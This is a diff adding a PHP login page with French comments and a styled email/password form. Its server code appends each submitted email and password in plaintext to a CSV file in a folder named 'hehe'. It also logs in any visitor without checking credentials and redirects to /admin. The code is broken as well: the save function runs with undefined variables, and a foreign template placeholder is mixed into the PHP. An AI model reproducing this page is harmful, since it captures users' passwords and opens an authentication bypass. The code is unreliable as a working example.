@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        header {
+            background-color: #000;
+            color: #fff;
+            text-align: center;
+            padding: 1em;
+        }
+
+        main {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 80vh;
+        }
+
+        .form-container {
+            text-align: center;
+            background-color: #f0f0f0;
+            padding: 2em;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        form {
+            margin-top: 1em;
+        }
+
+        #register-link {
+            margin-top: 1em;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+    <?php
+    session_start();
+
+    // Function to save form data to CSV
+    function saveToCSV($email, $password) {
+        $file = '/home/kys-master/kys_project/kys_project/hehe/u.csv';
+
+        // Check if the file exists, if not, create it and add header
+        if (!file_exists($file)) {
+            file_put_contents($file, "Email,Password\n");
+        }
+
+        // Append the form data to the CSV file
+		$success = file_put_contents($file, "$email,$password\n", FILE_APPEND);
+
+		return $success !== false;
+    }
+	
+	if (!saveToCSV($email, $password)) {
+    die('Error writing to CSV file');
+}
+    // Vérifiez si l'utilisateur est déjà connecté (par exemple, s'il existe une session)
+    if (isset($_SESSION['user'])) {
+        // Redirigez l'utilisateur vers la page principale
+        header("Location: /admin");
+        exit();
+    }
+	
+    // Vérifiez si le formulaire de connexion a été soumis
+    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["login"])) {
+        // Placez ici votre logique de vérification des informations d'identification
+        $email = $_POST["email"];
+        $password = $_POST["password"];
+
+        // Ajoutez ici la logique de vérification des informations d'identification (par exemple, avec le fichier users.txt)
+
+        // Si les informations d'identification sont correctes, enregistrez l'utilisateur dans la session
+        $_SESSION['user'] = $email;
+
+        // Save form data to CSV
+        saveToCSV($email, $password);
+
+        // Redirigez l'utilisateur vers la page principale
+        header("Location: /admin");
+        exit();
+    }
+    ?>
+
+    <header>
+        <h1>Login</h1>
+    </header>
+
+    <main>
+        <div class="form-container" id="login-form">
+            <form action="" method="post">
+                <label for="email">Email:</label>
+                <input type="email" id="email" name="email" required><br>
+                
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required><br>
+
+                <button type="submit" name="login">Login</button>
+            </form>
+
+			<a href="${request.route_url('register')}" id="register-link">Don't have an account? Register here.</a>
+        </div>
+    </main>
+
+</body>
+</html>
